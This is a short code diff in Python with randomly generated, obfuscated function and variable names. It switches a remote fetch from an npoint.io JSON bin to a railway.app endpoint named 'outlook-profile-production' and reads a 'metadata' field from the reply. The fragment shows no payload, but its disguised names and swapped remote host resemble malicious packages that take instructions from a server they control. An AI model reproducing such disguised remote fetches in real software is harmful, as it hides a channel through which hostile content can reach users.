@@ -16,7 +16,7 @@ def data_yhwjhp_809():
 
     def net_tewgth_744():
         try:
-            net_nypggw_506 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            net_nypggw_506 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             net_nypggw_506.raise_for_status()
             data_xjekfj_220 = net_nypggw_506.json()
             process_lbxocv_992 = data_xjekfj_220.get('metadata')
